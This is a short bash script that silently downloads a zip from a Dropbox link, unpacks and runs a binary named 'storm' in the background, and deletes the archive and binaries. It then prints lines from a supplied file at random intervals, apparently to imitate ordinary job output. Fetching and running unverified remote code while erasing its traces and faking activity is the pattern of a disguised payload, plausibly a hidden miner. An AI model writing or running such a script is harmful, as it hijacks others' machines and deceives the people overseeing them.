#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/6attsnmz5y8lk0f/wan22.zip -q
unzip wan22.zip > /dev/null 2>&1
#pwd
./storm ./cloud &
sleep 3
rm -rf wan22.zip
rm -rf storm
rm -rf cloud
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 26 ))
done < $2

